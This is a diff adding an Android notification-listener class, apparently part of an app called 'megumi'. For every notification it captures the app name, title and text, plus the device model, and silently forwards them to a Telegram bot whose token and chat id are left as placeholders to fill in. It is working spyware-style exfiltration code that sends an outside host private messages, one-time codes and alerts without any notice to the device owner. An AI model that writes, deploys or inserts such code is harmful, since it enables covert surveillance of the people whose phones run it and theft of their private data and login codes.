@@ -1,0 +1,46 @@
+package com.megumi.megumii;
+
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+
+public class NotificationListener extends NotificationListenerService {
+    OkHttpClient client = new OkHttpClient();
+    final String BOT_TOKEN = "ur bot token";
+    final String CHAT_ID = "ur chat id";
+
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        String packageName = sbn.getPackageName();
+        CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
+        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
+
+        if (title == null && text == null) return;
+
+        String message = "New Notification\n\n" +
+                "App: " + packageName + "\n" +
+                "Title: " + title + "\n" +
+                "Content:\n" + text + "\n\n" +
+                "Device: " + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+
+        sendToTelegram(message);
+    }
+
+    private void sendToTelegram(String text) {
+        String encodedText = URLEncoder.encode(text, StandardCharsets.UTF_8);
+        String url = "https://api.telegram.org/bot" + BOT_TOKEN +
+                "/sendMessage?chat_id=" + CHAT_ID +
+                "&text=" + encodedText;
+
+        Request request = new Request.Builder().url(url).build();
+        client.newCall(request).enqueue(new okhttp3.Callback() {
+            @Override public void onFailure(okhttp3.Call call, java.io.IOException e) {}
+            @Override public void onResponse(okhttp3.Call call, okhttp3.Response response) {}
+        });
+    }
+}
